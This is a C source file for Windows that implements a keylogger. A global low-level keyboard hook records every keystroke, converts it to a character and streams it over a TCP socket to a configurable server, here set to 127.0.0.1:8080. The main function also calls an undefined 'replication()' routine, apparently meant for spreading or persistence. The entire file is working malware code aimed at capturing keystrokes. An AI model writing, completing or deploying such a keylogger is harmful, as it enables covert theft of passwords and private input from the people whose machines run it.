#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <fcntl.h>
#include <io.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080

#define BUFFER_SIZE 1024

SOCKET sock = INVALID_SOCKET;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
			DWORD vkCode = kbdStruct->vkCode;
			DWORD scanCode = kbdStruct->scanCode;

			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);

			keyboardState[VK_SHIFT] = (BYTE)(GetAsyncKeyState(VK_SHIFT) & 0x8000 ? 0x80 : 0);
			keyboardState[VK_CONTROL] = (BYTE)(GetAsyncKeyState(VK_CONTROL) & 0x8000 ? 0x80 : 0);
			keyboardState[VK_MENU] = (BYTE)(GetAsyncKeyState(VK_MENU) & 0x8000 ? 0x80 : 0);
			keyboardState[VK_CAPITAL] = (BYTE)(GetKeyState(VK_CAPITAL) & 0x0001);

			HWND foreground = GetForegroundWindow();
			DWORD threadId = GetWindowThreadProcessId(foreground, NULL);
			HKL layout = GetKeyboardLayout(threadId);

			wchar_t unicodeBuf[8] = { 0 };
			int result = ToUnicodeEx(vkCode, scanCode, keyboardState,
				unicodeBuf, 8, 0, layout);

			if (result == 1) {

				wprintf(L"Sent: %c\n", unicodeBuf[0]);
				fflush(stdout);

				int sent = send(sock,
					(char *)unicodeBuf,
					sizeof(wchar_t),
					0);

				if (sent == SOCKET_ERROR) {
					wprintf(L"Send Error: %d\n", WSAGetLastError());
				}
			}

			else if (result > 1) {
				wprintf(L"Sent: %s", unicodeBuf);
				fflush(stdout);

				int sent = send(sock,
					(char *)unicodeBuf,
					result * sizeof(wchar_t),
					0);

				if (sent == SOCKET_ERROR) {
					wprintf(L"Send Error: %d\n", WSAGetLastError());
				}
			}
			else if (result == -1) {
				wprintf(L"[Dead Key: vk=0x%02X]\n", vkCode);
				fflush(stdout);
			}
			// To be updated soon
			else {
				wprintf(L"[Special Key: vk=0x%02X]\n", vkCode);
				fflush(stdout);
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void) {

	replication();

	WSADATA wsaData;
	struct sockaddr_in serv_addr;

	_setmode(_fileno(stdout), _O_U16TEXT);
	_setmode(_fileno(stderr), _O_U16TEXT);

	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
	if (!hook) {
		fwprintf(stderr, L"Hook could not be set up: %lu\n", GetLastError());
		return 1;
	}

	wprintf(L"Initializing Winsock...\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		wprintf(L"Error: WSAStartup failed. Error Code: %d\n", WSAGetLastError());
		return 1;
	}

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		wprintf(L"Error: Could not create socket. Error Code: %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(SERVER_PORT);

	if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
		wprintf(L"Error: Invalid or unsupported address.\n");
		closesocket(sock);
		WSACleanup();
		return 1;
	}

	wprintf(L"Connecting to the server... (%hs:%d)\n", SERVER_IP, SERVER_PORT);
	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
		wprintf(L"Error: Connection failed.\n");
		closesocket(sock);
		WSACleanup();
		return 1;
	}

	wprintf(L"Connection successful!\n\n");

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hook);

	closesocket(sock);
	WSACleanup();
}
